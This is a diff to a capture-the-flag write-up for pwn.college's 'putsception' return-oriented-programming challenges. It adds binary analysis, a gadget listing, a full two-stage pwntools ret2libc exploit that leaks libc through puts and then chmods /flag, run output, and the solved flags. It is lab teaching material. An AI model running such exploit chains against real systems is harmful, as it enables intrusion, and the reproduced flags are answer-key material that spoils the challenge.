@@ -6263,7 +6263,7 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -r /challenge/put
 
 #### `_start()`
 
-Lets find the address of `main()` so that we can call it to run the challenge for the second stage fo the exploit.
+Lets find the address of `_start()` so that we can call it to run the challenge for the second stage fo the exploit.
 
 ```
 pwndbg> info address _start
@@ -6278,7 +6278,7 @@ Symbol "_start" is at 0x4011b0 in a file compiled without debugging.
 - [ ] Locations of required ROP gadgets
 - [x] Address of `_start()`: `0x4011b0`
 
-#### `challegne()`
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -6725,6 +6725,10 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-li
    - `pop rsi ; pop r15 ; ret`: `0x402221`
 - [x] Address of `_start()`: `0x4011b0`
 
+### ROP chain (ret2libc)
+
+tbc.
+
 ### Exploit
 
 #### Stage 1: Leaking the address of `puts` within Libc 
@@ -6798,13 +6802,10 @@ context.arch = 'amd64'
 # ROP gadgets
 pop_rdi = 0x402223
 pop_rsi_pop_r15 = 0x402221
-
 # PLT entries
 puts_plt = 0x401110
-
 # GOT entries
 puts_got = 0x405028
-
 # Memory addresses and offsets
 start_func_addr = 0x4011b0
 bang_addr = 0x403606
@@ -6813,7 +6814,7 @@ offset = 56
 p = process('/challenge/putsception-easy')
 
 # --- STAGE 1: Leak address of `puts` within Libc ---
-log.info("Sending Stage 2: puts(puts@got)")
+log.info("Sending Stage 1: puts(puts@got)")
 payload1 = flat(
     b"A" * offset,
 
@@ -6863,7 +6864,7 @@ p.interactive()
 ```
 hacker@return-oriented-programming~putsception-easy:~$ python ~/script.py
 [+] Starting local process '/challenge/putsception-easy': pid 1702
-[*] Sending Stage 2: puts(puts@got)
+[*] Sending Stage 1: puts(puts@got)
 
 [+] puts@libc: 0x71d8806e9420
 [+] libc_base: 0x71d880665000
@@ -6908,5 +6909,455 @@ pwn.college{oLES8Yo4ZJFl1m52C_WB44G-Smt.0VN1MDL4ITM0EzW}
 ## Putsception (Hard)
 
 ```
+hacker@return-oriented-programming~putsception-hard:/$ /challenge/putsception-hard 
+###
+### Welcome to /challenge/putsception-hard!
+###
 
+```
+
+Requirements to craft a successful exploit.
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+### Binary Analysis
+
+#### `puts@plt` (Procedure Linkage Table entry)
+
+Let's get the address of `puts@plt`.
+
+```
+hacker@return-oriented-programming~putsception-hard:/$ objdump -d /challenge/putsception-hard | grep "<puts@plt>:"
+0000000000401090 <puts@plt>:
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [ ] Location of the GOT entry of `puts@got`
+- [ ] Location of a NULL terminated string:
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `puts@got` (Global Offset Table entry)
+
+```
+hacker@return-oriented-programming~putsception-hard:/$ readelf -r /challenge/putsception-hard | grep "puts"
+000000405020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `_start()`
+
+Lets find the address of `_start()` so that we can call it to run the challenge for the second stage fo the exploit.
+
+```
+pwndbg> info address _start
+Symbol "_start" is at 0x4010d0 in a file compiled without debugging.
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [x] Address of `_start()`: `0x4010d0`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000402150 <+0>:     endbr64
+   0x0000000000402154 <+4>:     push   rbp
+   0x0000000000402155 <+5>:     mov    rbp,rsp
+   0x0000000000402158 <+8>:     sub    rsp,0x60
+   0x000000000040215c <+12>:    mov    DWORD PTR [rbp-0x44],edi
+   0x000000000040215f <+15>:    mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000402163 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
+   0x0000000000402167 <+23>:    lea    rax,[rbp-0x40]
+   0x000000000040216b <+27>:    mov    edx,0x1000
+   0x0000000000402170 <+32>:    mov    rsi,rax
+   0x0000000000402173 <+35>:    mov    edi,0x0
+   0x0000000000402178 <+40>:    call   0x4010b0 <read@plt>
+   0x000000000040217d <+45>:    mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000402180 <+48>:    lea    rdi,[rip+0xe7d]        # 0x403004
+   0x0000000000402187 <+55>:    call   0x401090 <puts@plt>
+   0x000000000040218c <+60>:    nop
+   0x000000000040218d <+61>:    leave
+   0x000000000040218e <+62>:    ret
+End of assembler dump.
+```
+
+Set a breakpoint at `challenge+40` and run.
+
+```
+pwndbg> break *(challenge+40)
+Breakpoint 1 at 0x402178
+```
+
+```
+pwndbg> run
+Starting program: /challenge/putsception-hard 
+###
+### Welcome to /challenge/putsception-hard!
+###
+
+
+Breakpoint 1, 0x0000000000402178 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
+ RBX  0x402250 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7fff1ca543f8 —▸ 0x7fff1ca55675 ◂— '/challenge/putsception-hard'
+ RDX  0x1000
+ RDI  0
+ RSI  0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
+ R8   0
+ R9   0x2c
+ R10  0x4004e9 ◂— 0x66756276746573 /* 'setvbuf' */
+ R11  0x78b0c2953ce0 (setvbuf) ◂— endbr64 
+ R12  0x4010d0 (_start) ◂— endbr64 
+ R13  0x7fff1ca543f0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff1ca542d0 —▸ 0x7fff1ca54300 ◂— 0
+ RSP  0x7fff1ca54270 ◂— 0
+ RIP  0x402178 (challenge+40) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x402178 <challenge+40>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
+        nbytes: 0x1000
+ 
+   0x40217d <challenge+45>    mov    dword ptr [rbp - 4], eax
+   0x402180 <challenge+48>    lea    rdi, [rip + 0xe7d]           RDI => 0x403004 ◂— 'Leaving!'
+   0x402187 <challenge+55>    call   puts@plt                    <puts@plt>
+ 
+   0x40218c <challenge+60>    nop    
+   0x40218d <challenge+61>    leave  
+   0x40218e <challenge+62>    ret    
+ 
+   0x40218f <main>            endbr64 
+   0x402193 <main+4>          push   rbp
+   0x402194 <main+5>          mov    rbp, rsp
+   0x402197 <main+8>          sub    rsp, 0x20
+──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7fff1ca54270 ◂— 0
+01:0008│-058     0x7fff1ca54278 —▸ 0x7fff1ca54408 —▸ 0x7fff1ca55691 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-050     0x7fff1ca54280 —▸ 0x7fff1ca543f8 —▸ 0x7fff1ca55675 ◂— '/challenge/putsception-hard'
+03:0018│-048     0x7fff1ca54288 ◂— 0x100000000
+04:0020│ rax rsi 0x7fff1ca54290 —▸ 0x78b0c2ab84a0 (_IO_file_jumps) ◂— 0
+05:0028│-038     0x7fff1ca54298 —▸ 0x78b0c295d53d (_IO_file_setbuf+13) ◂— test rax, rax
+06:0030│-030     0x7fff1ca542a0 —▸ 0x78b0c2abc6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-028     0x7fff1ca542a8 —▸ 0x78b0c2953de5 (setvbuf+261) ◂— xor r8d, r8d
+────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x402178 challenge+40
+   1         0x402234 main+165
+   2   0x78b0c28f3083 __libc_start_main+243
+   3         0x4010fe _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+   - Location of the buffer: `0x7fff1ca54290`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [x] Address of `_start()`: `0x4010d0`
+
+Now, lets find the location of the stored return address and calculate the offset.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7fff1ca542e0:
+ rip = 0x402178 in challenge; saved rip = 0x402234
+ called by frame at 0x7fff1ca54310
+ Arglist at 0x7fff1ca542d0, args: 
+ Locals at 0x7fff1ca542d0, Previous frame's sp is 0x7fff1ca542e0
+ Saved registers:
+  rbp at 0x7fff1ca542d0, rip at 0x7fff1ca542d8
+```
+
+```
+pwndbg> p/d 0x7fff1ca542d8 - 0x7fff1ca54290
+$1: 72
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `72`
+   - Location of the buffer: `0x7fff1ca54290`
+   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [x] Address of `_start()`: `0x4010d0`
+
+Let's find a relevant NULL terminated string.
+
+```
+hacker@return-oriented-programming~putsception-hard:/$ objdump -s -j .rodata /challenge/putsception-hard | grep -E "[0-9a-f]{2}00"
+ 403000 01000200 4c656176 696e6721 00232323  ....Leaving!.###
+ 403030 2100                                 !.  
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `72`
+   - Location of the buffer: `0x7fff1ca54290`
+   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [x] Location of a NULL terminated string: `0x403030`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [x] Address of `_start()`: `0x4010d0`
+
+#### ROP gadgets
+
+```
+hacker@return-oriented-programming~putsception-hard:/$ ROPgadget --binary /challenge/putsception-hard 
+Gadgets information
+============================================================
+0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
+0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
+0x00000000004022bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
+0x0000000000402241 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x0000000000402242 : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
+0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004022be : add byte ptr [rax], al ; endbr64 ; ret
+0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
+0x0000000000402243 : add byte ptr [rax], al ; leave ; ret
+0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
+0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000401199 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004010fb : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
+0x0000000000402244 : add cl, cl ; ret
+0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
+0x0000000000401038 : add dl, dh ; jmp 0x401020
+0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401197 : add eax, 0x3ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401017 : add esp, 8 ; ret
+0x0000000000401016 : add rsp, 8 ; ret
+0x000000000040218b : call qword ptr [rax + 0xff3c3c9]
+0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
+0x0000000000401014 : call rax
+0x00000000004011b3 : cli ; jmp 0x401140
+0x0000000000401103 : cli ; ret
+0x00000000004022cb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
+0x00000000004011b0 : endbr64 ; jmp 0x401140
+0x0000000000401100 : endbr64 ; ret
+0x000000000040229c : fisttp word ptr [rax - 0x7d] ; ret
+0x00000000004010fe : hlt ; nop ; endbr64 ; ret
+0x0000000000401012 : je 0x401016 ; call rax
+0x0000000000401125 : je 0x401130 ; mov edi, 0x405050 ; jmp rax
+0x0000000000401167 : je 0x401170 ; mov edi, 0x405050 ; jmp rax
+0x000000000040103a : jmp 0x401020
+0x00000000004011b4 : jmp 0x401140
+0x000000000040100b : jmp 0x4840104f
+0x000000000040112c : jmp rax
+0x000000000040218d : leave ; ret
+0x000000000040112d : loopne 0x401195 ; nop ; ret
+0x0000000000401196 : mov byte ptr [rip + 0x3ecb], 1 ; pop rbp ; ret
+0x0000000000402240 : mov eax, 0 ; leave ; ret
+0x0000000000401127 : mov edi, 0x405050 ; jmp rax
+0x00000000004010ff : nop ; endbr64 ; ret
+0x000000000040218c : nop ; leave ; ret
+0x0000000000402146 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402147 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402148 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000402149 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040214a : nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040214b : nop ; nop ; nop ; pop rbp ; ret
+0x000000000040214c : nop ; nop ; pop rbp ; ret
+0x000000000040214d : nop ; pop rbp ; ret
+0x000000000040112f : nop ; ret
+0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
+0x0000000000401126 : or dword ptr [rdi + 0x405050], edi ; jmp rax
+0x00000000004022ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004022ae : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004022b0 : pop r14 ; pop r15 ; ret
+0x00000000004022b2 : pop r15 ; ret
+0x00000000004022ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004022af : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040119d : pop rbp ; ret
+0x00000000004022b3 : pop rdi ; ret
+0x00000000004022b1 : pop rsi ; pop r15 ; ret
+0x00000000004022ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401129 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
+0x0000000000401128 : push rax ; push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
+0x000000000040101a : ret
+0x0000000000401198 : retf
+0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
+0x00000000004022cd : sub esp, 8 ; add rsp, 8 ; ret
+0x00000000004022cc : sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x405050 ; jmp rax
+0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x405050 ; jmp rax
+0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+
+Unique gadgets found: 78
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `72`
+   - Location of the buffer: `0x7fff1ca54290`
+   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [x] Location of a NULL terminated string: `0x403030`
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x4022b3`
+   - `pop rsi ; pop r15 ; ret`: `0x4022b1`
+- [x] Address of `_start()`: `0x4010d0`
+
+#### Libc functions
+
+Lets find the offset of the relevant functions within Libc.
+
+```
+hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
+   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
+   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
+   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
+   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
+  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
+```
+
+```
+hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `72`
+   - Location of the buffer: `0x7fff1ca54290`
+   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [x] Location of a NULL terminated string: `0x403030`
+- [x] Offsets of required Libc functions
+    - Offset of the `puts` symbol within Libc: `0x84420`
+    - Offset of the `chmod` symbol within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x4022b3`
+   - `pop rsi ; pop r15 ; ret`: `0x4022b1`
+- [x] Address of `_start()`: `0x4010d0`
+
+### ROP chain (ret2libc)
+
+The ROP chain in this version would be the same as the [easy version](#rop-chain-ret2libc-2).
+
+### Exploit
+
+```
+hacker@return-oriented-programming~putsception-hard:~$ ln -sf /flag ~/!
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+context.arch = 'amd64'
+
+# ROP gadgets
+pop_rdi = 0x4022b3
+pop_rsi_pop_r15 = 0x4022b1
+# PLT entries
+puts_plt = 0x401090
+# GOT entries
+puts_got = 0x405020
+# Memory addresses and offsets
+start_func_addr = 0x4010d0
+bang_addr = 0x403030
+offset = 72
+
+p = process('/challenge/putsception-hard')
+
+# --- STAGE 1: Leak address of `puts` within Libc ---
+log.info("Sending Stage 1: puts(puts@got)")
+payload1 = flat(
+    b"A" * offset,
+
+    # puts(puts@got)
+    pop_rdi, puts_got,
+    puts_plt,
+
+    # Call _start()
+    start_func_addr
+)
+
+# Send payload
+p.send(payload1)
+
+# Parse the leak
+p.recvuntil(b"Leaving!\n")
+leak = p.recv(6)
+puts_libc = u64(leak.ljust(8, b"\x00"))
+
+# Calculate the address of the Libc entry of chmod
+libc_base = puts_libc - 0x84420
+chmod_libc = libc_base + 0x10dd80
+
+print(f"\n[+] puts@libc: {hex(puts_libc)}")
+print(f"[+] libc_base: {hex(libc_base)}")
+print(f"[+] chmod@libc: {hex(chmod_libc)}\n")
+
+# --- STAGE 2: CHMOD ---
+log.info("Sending Stage 2: chmod('!', 0o777)")
+payload2 = flat(
+    b"A" * offset,
+    
+    pop_rdi, bang_addr,      
+    pop_rsi_pop_r15, 0o777, b"B" * 8, 
+    chmod_libc
+)
+
+p.send(payload2)
+
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~putsception-hard:~$ python ~/script.py
+[+] Starting local process '/challenge/putsception-hard': pid 8385
+[*] Sending Stage 1: puts(puts@got)
+
+[+] puts@libc: 0x7147bcb0a420
+[+] libc_base: 0x7147bca86000
+[+] chmod@libc: 0x7147bcb93d80
+
+[*] Sending Stage 2: chmod('!', 0o777)
+[*] Switching to interactive mode
+
+###
+### Welcome to (null)!
+###
+
+[*] Process '/challenge/putsception-hard' stopped with exit code 0 (pid 8385)
+Leaving!
+[*] Got EOF while reading in interactive
+$
+```
+
+```
+hacker@return-oriented-programming~putsception-hard:~$ cat /flag 
+pwn.college{08FHECJ2yZ8oCwu4qXEb4515eSO.0lN1MDL4ITM0EzW}
 ```
